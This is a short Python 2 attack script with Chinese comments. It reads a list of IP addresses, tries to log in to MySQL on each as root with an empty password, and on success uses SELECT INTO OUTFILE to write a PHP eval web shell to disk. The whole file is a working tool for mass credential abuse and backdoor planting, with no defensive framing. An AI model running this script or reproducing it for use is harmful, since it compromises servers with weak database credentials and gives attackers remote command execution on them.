#!/usr/bin/env python
#coding=utf-8
#author:Blus

import MySQLdb
def mysql_connect1(ip,shell_url):
    #尝试数据库连接
    try:
        conn=MySQLdb.connect(host=ip,user='root',passwd='',db='',port=3306)
        cur=conn.cursor()

        #若数据库连接成功，开始写马
        try:

            sql_insert="SELECT '<?php @eval($_POST[cmd]); ?>'into outfile '{}';".format(shell_url)
            #print sql_insert;

            cur.execute(sql_insert)
            print "写入成功".decode()
        except Exception as e:
            print "写入错误"
            print e;
            return
        cur.close()
        conn.close()

    except MySQLdb.Error,e:
        print "Mysql_Error: %d: %s" % (e.args[0], e.args[1])
        return 

if __name__ == "__main__":
    fp_ip=open('ip.txt')
    shell_url = 'D:/1.PHP'

    for ip in fp_ip.readlines():
        fp4=ip.replace('\r',"").replace('\n',"")
        # url=str(fp5)
        print fp4
        mysql_connect1(ip,shell_url)

    print '检测结束'
